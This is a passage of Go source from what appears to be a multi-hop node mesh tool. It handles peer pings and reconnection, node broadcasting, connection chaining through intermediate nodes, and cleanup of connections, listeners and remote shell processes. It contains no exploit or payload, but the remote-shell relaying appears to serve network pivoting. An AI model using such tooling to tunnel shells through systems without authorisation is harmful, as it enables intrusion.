	for _, n := range nodeMap {
		if n.uuid != currentNode.uuid {
			func() {

				l.RUnlock()
				defer clientLock.RLock(l)
				ok, err = f(n)
			}()
			if err != nil {
				return err
			}
			if !ok {
				break
			}
		}
	}
	return nil
}
func (n *node) ping(id uint32) {

	l := clientLock.Lock()

	defer func() {
		l.Unlock()
	}()
	now := time.Now()
	if n.pingTime > n.pongTime {
		if common.Debug {
			fmt.Println(time.Now().Format("2006-01-02 15:04:05"), n.uuid, "超时")
		}
		if n.conn != nil && n.conn.node.uuid == n.uuid {
			n.conn.Close("超时关闭")
		}
		n.Delete("超时关闭")
		//尝试重连

		go func() {
			if !currentConfig.Limit && len(n.mainIp) > 0 {
				for _, addr := range n.mainIp {
					_n, _ := connectNew(fmt.Sprintf("%s:%d", addr, n.port))
					if _n != nil {
						return
					}
				}
			}
		}()
		return
	}
	n.pingTime = now.Unix()
	if n.pongTime == 0 {
		n.pongTime = n.pingTime
	}

	pingdata := make([]byte, 8)
	pingdata[0] = byte(n.pingTime & 255)
	pingdata[1] = byte(n.pingTime >> 8 & 255)
	pingdata[2] = byte(n.pingTime >> 16 & 255)
	pingdata[3] = byte(n.pingTime >> 24 & 255)
	pingdata[4] = byte(n.pingTime >> 32 & 255)
	pingdata[5] = byte(n.pingTime >> 40 & 255)
	pingdata[6] = byte(n.pingTime >> 48 & 255)
	pingdata[7] = byte(n.pingTime >> 56 & 255)
	msg := &common.Msg{
		From:       currentNode.uuid,
		To:         n.uuid,
		CmdOpteion: common.CMD_PING,
		CmdId:      id,
		CmdData:    pingdata,
	}
	n.WriteMsg(msg)

	n.listenMap.Range(func(key, value interface{}) bool {
		switch v := value.(type) {
		case *serverListen:
			msg.CmdOpteion = common.CMD_PING_LISTEN
			msg.CmdData = nil
			n.WriteMsg(msg)
		case *clientListen:
			msg.CmdOpteion = common.CMD_PING_LISTEN
			msg.CmdData = nil
			v.server.WriteMsg(msg)
		}

		return true
	})
}
func (n *node) Delete(reason string) {
	go func() {
		l := clientLock.Lock()
		_, ok := nodeMap[n.uuid]
		if ok {
			delete(nodeMap, n.uuid)
		}
		l.Unlock()
		n.connMap.Range(func(key, value interface{}) bool {
			if v, ok := value.(common.Conn); ok {
				v.Close(reason)
			}
			n.connMap.Delete(key)
			return true
		})
		n.udpConnMap.Range(func(key, value interface{}) bool {
			if v, ok := value.(common.Conn); ok {
				v.Close(reason)
			}
			n.udpConnMap.Delete(key)
			return true
		})
		n.listenMap.Range(func(key, value interface{}) bool {

			if v, ok := value.(*serverListen); ok {
				v.listen.Close()
			}
			n.listenMap.Delete(key)
			return true
		})
		n.shellMap.Range(func(key, value interface{}) bool {
			v := value.(*remoteCmd)
			if v.cmd != nil {
				v.cmd.Process.Kill()
			}
			n.shellMap.Delete(key)
			return true
		})
	}()

}
func (n *node) broadcastNode() {
	//广播新增节点
	nmsg := nodeMsg{
		UUID:     n.uuid,
		HostName: n.hostName,
		Addr:     n.addr,
		MainIp:   n.mainIp,
		Port:     n.port,
		Goos:     n.goos,
	}
	b, _ := json.Marshal(nmsg)
	writemsg := &common.Msg{
		From:    currentNode.uuid,
		To:      common.BroadcastUUID.String(),
		CmdData: append([]byte{common.CMD_ADD_NODE, 0, 0}, b...),
	}
	go allNodesDo(func(_n *node) (bool, error) {

		if _n.uuid != currentNode.uuid {

			_n.WriteMsg(writemsg)
		}
		return true, nil
	})
}

func GetNodeFromAddrs(dst []string) (n *node, err error) {
	if len(dst) == 0 {
		return nil, errors.New("参数错误,目标节点为空")
	}
	if n, err = getNode(dst[0]); err != nil {
		return
	}

	for i := 1; i < len(dst); i++ {
		n, err = n.remoteReg(dst[i])
		if err != nil {
			return
		}
	}
	if n == nil {
		return nil, fmt.Errorf("无法连接 %v", dst)
	}
	if n.uuid == currentNode.uuid {
		return nil, errors.New("不能连接自己")
	}
	return
}

// 储存并返回id
func (n *node) storeQuery(v chan interface{}) (newID uint32) {

	for {
		newID = common.GetConnID()
		if newID == 0 {
			continue
		}
		if _, ok := n.queryMap.LoadOrStore(newID, v); !ok {
			return
		}
	}
}
func (n *node) loadQuery(id uint32) (v chan interface{}, ok bool) {
	value, ok := n.queryMap.Load(id)
	if ok {
		v = value.(chan interface{})
	}
	return v, ok
}
func (n *node) deleteQuery(id uint32) {
	n.queryMap.Delete(id)
}
func (n *node) storeConn(v common.Conn) (newID uint32) {

	for {
		newID = common.GetConnID()
		if newID == 0 {
			continue
		}
		if _, ok := n.connMap.LoadOrStore(newID, v); !ok {
			return
		}
	}
}
func (n *node) writeGetNodeResult(id uint32) {
	l := clientLock.RLock()

	defer l.RUnlock()

	var s []nodeMsg

	for _, _n := range nodeMap {
		if _n.uuid != currentNode.uuid {
			s = append(s, nodeMsg{
				UUID:     _n.uuid,
				HostName: _n.hostName,
				Addr:     _n.addr,
				MainIp:   _n.mainIp,
				Port:     _n.port,
				Goos:     _n.goos,
			})
		}

	}

	b, _ := json.Marshal(s)
	n.Write(common.CMD_GET_NODE_RESULT, id, b)
}
